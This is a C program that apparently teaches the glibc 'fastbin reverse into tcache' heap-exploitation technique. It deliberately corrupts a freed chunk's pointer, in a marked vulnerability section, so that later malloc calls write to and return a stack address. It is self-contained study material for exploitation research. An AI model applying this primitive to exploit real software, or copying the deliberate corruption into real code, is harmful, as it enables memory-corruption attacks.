#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const size_t allocsize = 0x40;

int main(){
  fprintf(
    stderr,
    "\n"
    "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
    "except it works with a small allocation size (allocsize <= 0x78).\n"
    "The goal is to set things up so that a call to malloc(allocsize) will write\n"
    "a large unsigned value to the stack.\n\n"
  );

  // Allocate 14 times so that we can free later.
  char* ptrs[14];
  size_t i;
  for (i = 0; i < 14; i++) {
    ptrs[i] = malloc(allocsize);
  }

  fprintf(
    stderr,
    "First we need to free(allocsize) at least 7 times to fill the tcache.\n"
    "(More than 7 times works fine too.)\n\n"
  );

  // Fill the tcache.
  for (i = 0; i < 7; i++) {
    free(ptrs[i]);
  }

  char* p = ptrs[7];
  fprintf(
    stderr,
    "The next pointer that we free is the chunk that we're going to corrupt: %p\n"
    "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
    "already full, it will go in the fastbin.\n\n",
    p
  );
  free(p);

  fprintf(
    stderr,
    "Next we need to free between 1 and 6 more pointers. These will also go\n"
    "in the fastbin. If the stack address that we want to overwrite is not zero\n"
    "then we need to free exactly 6 more pointers, otherwise the attack will\n"
    "cause a segmentation fault. But if the value on the stack is zero then\n"
    "a single free is sufficient.\n\n"
  );

  // Fill the fastbin.
  for (i = 8; i < 14; i++) {
    free(ptrs[i]);
  }

  // Create an array on the stack and initialize it with garbage.
  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  fprintf(
    stderr,
    "The stack address that we intend to target: %p\n"
    "It's current value is %p\n",
    &stack_var[2],
    (char*)stack_var[2]
  );

  fprintf(
    stderr,
    "Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
    "to overwrite the next pointer at address %p\n\n",
    p
  );

  //------------VULNERABILITY-----------

  // Overwrite linked list pointer in p.
  *(size_t**)p = &stack_var[0];

  //------------------------------------

  fprintf(
    stderr,
    "The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"
  );

  // Empty tcache.
  for (i = 0; i < 7; i++) {
    ptrs[i] = malloc(allocsize);
  }

  fprintf(
    stderr,
    "Let's just print the contents of our array on the stack now,\n"
    "to show that it hasn't been modified yet.\n\n"
  );

  for (i = 0; i < 6; i++) {
    fprintf(stderr, "%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  fprintf(
    stderr,
    "\n"
    "The next allocation triggers the stack to be overwritten. The tcache\n"
    "is empty, but the fastbin isn't, so the next allocation comes from the\n"
    "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
    "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
    "address that we are targeting ends up being the first chunk in the tcache.\n"
    "It contains a pointer to the next chunk in the list, which is why a heap\n"
    "pointer is written to the stack.\n"
    "\n"
    "Earlier we said that the attack will also work if we free fewer than 6\n"
    "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
    "That's because the value on the stack is treated as a next pointer in the\n"
    "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
    "\n"
    "The contents of our array on the stack now look like this:\n\n"
  );

  malloc(allocsize);

  for (i = 0; i < 6; i++) {
    fprintf(stderr, "%p: %p\n", &stack_var[i], (char*)stack_var[i]);
  }

  char *q = malloc(allocsize);
  fprintf(
    stderr,
    "\n"
    "Finally, if we malloc one more time then we get the stack address back: %p\n",
    q
  );

  return 0;
}
